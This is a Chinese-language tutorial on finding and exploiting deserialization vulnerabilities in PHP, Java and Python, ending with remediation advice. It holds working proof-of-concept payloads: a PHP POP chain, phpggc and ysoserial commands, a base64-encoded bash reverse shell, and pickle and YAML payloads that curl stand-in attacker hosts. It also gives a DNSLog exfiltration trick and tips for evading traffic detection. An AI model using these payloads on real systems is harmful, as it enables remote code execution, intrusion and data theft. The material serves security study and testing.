# 反序列化漏洞挖掘（PHP / Java / Python）

## 1. 漏洞概述

当应用把用户可控的数据作为反序列化输入，并且反序列化过程触发了类中定义的"魔术方法 / 析构函数 / 调用拦截器"时，攻击者可以通过构造特定对象，让这些"魔术方法"做非预期操作（写文件、调用其它类方法、查询数据库等），最终形成一条"Gadget Chain（POP 链）"实现任意命令执行。

| 语言 | 核心反序列化函数 | 典型魔术方法 / 入口 |
|------|-----------------|---------------------|
| PHP | `unserialize()` | `__construct`、`__destruct`、`__wakeup`、`__toString`、`__invoke`、`__call`、`__get`、`__set` |
| Java | `ObjectInputStream.readObject()` | `readObject()`、`readResolve()`、`toString()`、`compareTo()`、`HashMap.put()` |
| Python | `pickle.loads()`、`yaml.load()`、`jsonpickle.decode()` | `__reduce__`、`__reduce_ex__`、`__setstate__`、`__getstate__` |

## 2. PHP 反序列化

### 2.1 识别注入点

以下参数名和特征通常是信号：

- 参数中出现 `O:8:"TestClass":...`、`a:3:{i:0;s:...}` 这种 PHP 序列化字符串
- Base64 解码后为上述格式
- Cookie、Session、Token 中出现长串 Base64 / URL 编码
- 调试参数 `?debug=1` 直接打印 `serialize()` 结果

### 2.2 典型 POP 链思路

1. **析构入口**：寻找 `__destruct` 或 `__wakeup` 中调用了本对象可控属性的方法；
2. **中转方法**：`__toString` 被调用（对象被当作字符串拼接时）；
3. **调用拦截**：`__call($name, $args)` 在调用不存在的方法时触发；
4. **属性拦截**：`__get($name)` / `__set($name, $val)` 在访问不存在的属性时触发；
5. **可调用对象**：`__invoke()` 在对象被当作函数调用时触发。

示例 POP 链（概念型）：

```php
class A {
    public $x;
    function __destruct() { $this->x->run(); }   // 入口
}
class B {
    public $y;
    function run() { system($this->y); }          // 中转
}

// 构造 payload：
$a = new A();
$a->x = new B();
$a->x->y = 'cat /etc/passwd';
echo serialize($a);
```

### 2.3 常见 POP 链库

- **Laravel**：多个版本存在 `Illuminate\Broadcasting\PendingBroadcast` → `__destruct` 触发 `Dispatcher->dispatch()` → RCE；
- **ThinkPHP**：5.x 版本存在多套利用链（依赖存储驱动 / PDO）；
- **WordPress 部分插件**：如 `cart66`、`revslider` 历史上存在反序列化；
- **phpggc**：GitHub 项目，集成了大量框架的 POP 链生成脚本：

```bash
phpggc Laravel/RCE1 system 'id'   # 生成 Laravel RCE1 payload
phpggc -b Laravel/RCE1 system 'id' # base64 输出
phpggc -u Drupal7/FOO 'curl evil.com'
```

## 3. Java 反序列化

### 3.1 识别注入点

- 请求 Body 以 `AC ED 00 05`（十六进制）开头 → Java 原生序列化（ObjectOutputStream）
- JSON / XML 库调用 `ObjectMapper.readValue(input, Object.class)`、`XStream.fromXML()`、`XMLDecoder`、`SnakeYAML.load()`、`Kryo.readObject()`
- 框架：Weblogic T3 协议、JBoss / JMX / RMI 端口、ActiveMQ OpenWire、Jenkins CLI、Shiro `rememberMe` Cookie

### 3.2 经典 Gadget

| Gadget | 核心类 | 利用链入口 |
|--------|--------|-----------|
| Commons-Collections 3.1/3.2.1 | `InvokerTransformer` / `ChainedTransformer` | `AnnotationInvocationHandler.readObject` |
| CommonsBeanutils 1.8.3-1.9.2 | `BeanComparator`、`PropertyUtilsBean` | `PriorityQueue.readObject` 触发 compare |
| JDK7u21 / JDK8u20 | `AnnotationInvocationHandler` + `LinkedHashSet` | 不依赖第三方库 |
| ROME | `EqualsBean`、`ToStringBean` | `Object.equals` / `toString` |
| Spring AOP | `JdkDynamicAopProxy` | `InvocationHandler` 拦截 |

### 3.3 ysoserial 实战示例

```bash
# 1. 生成 CommonsCollections2 payload（需要 CommonsBeanutils + PriorityQueue）
java -jar ysoserial.jar CommonsCollections2 'curl http://evil.example.com/rce' > payload.bin

# 2. Base64 输出（常用于 HTTP Cookie / POST）
java -jar ysoserial.jar CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4...}|{base64,-d}|{bash,-i}' | base64 -w0

# 3. WebLogic / JBoss 场景：结合 T3 协议工具
# 使用 GitHub 上 CVE-2015-4852 / CVE-2017-3248 相关 PoC
# 将 payload.bin 写入工具对应的请求结构
```

### 3.4 常见利用靶场

- Shiro `rememberMe`：AES key 弱密码 → 反序列化 payload
- JBoss 5.x/6.x `/invoker/JMXInvokerServlet`、`/web-console/Invoker`
- WebLogic T3 / IIOP 开放端口（常见于 7001）
- Jenkins CLI `X-Stream` 协议

## 4. Python 反序列化

### 4.1 pickle 基本原理

`pickle.loads(user_input)` 时会执行 `__reduce__()` 返回的 `(callable, args)`，可直接调用任意系统函数。

最小 PoC：

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl evil.example.com/rce',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

### 4.2 常见注入点

- Flask `app.secret_key` 泄漏后，`itsdangerous` 签名的 `session` 可反序列化
- YAML 解析：`yaml.load(user_input)` 在 PyYAML 5.1 以下默认为 `FullLoader`，可触发 `!!python/object`
- `jsonpickle.decode(user_input)` 直接支持 `py/object` 类型
- `xmlrpc` / `marshall` / `shelve` 模块

yaml.load PoC：

```yaml
!!python/object/apply:os.system
- "curl http://evil.example.com/rce"
```

## 5. 挖掘实战步骤

1. **识别输入**：通过 Burp 历史搜索 `unserialize` / `readObject` / `pickle` / `base64` 等关键字，定位可控反序列化输入点。
2. **搜集类定义**：在 Java 场景使用 `jd-cli` / CFR 反编译，或阅读开源源码；在 PHP 场景通过 `phpggc` 列表确认可用 gadget。
3. **构造 / 生成 payload**：使用 `phpggc` / `ysoserial` / `marshalsea` 生成对应链并编码。
4. **命令回显**：如果目标不能直接回显，可以使用 DNSLog（如 `curl evil.ceye.io/$(whoami)`）、Burp Collaborator 或自建服务器回带结果。
5. **流量变形**：对 payload 做 gzip/deflate/hex/base64 编码，或使用分块传输，绕过流量检测。

## 6. 修复建议

1. **禁止反序列化用户输入**：尽量使用 JSON / XML 等纯数据格式而非二进制对象流。
2. **白名单类**：Java 场景实现自定义 `ObjectInputStream.resolveClass()`，仅允许明确列出的类；Python 场景使用 `yaml.safe_load` / `pickle` 仅接受可信签名数据。
3. **升级第三方库**：及时升级 Commons-Collections、CommonsBeanutils、Spring、Shiro、JDK 等依赖。
4. **最小化依赖**：移除未使用的第三方库，降低 gadget 可用面。
5. **RASP / WAF**：部署 RASP 拦截危险反射调用；在边界阻断 T3、IIOP 等协议端口。
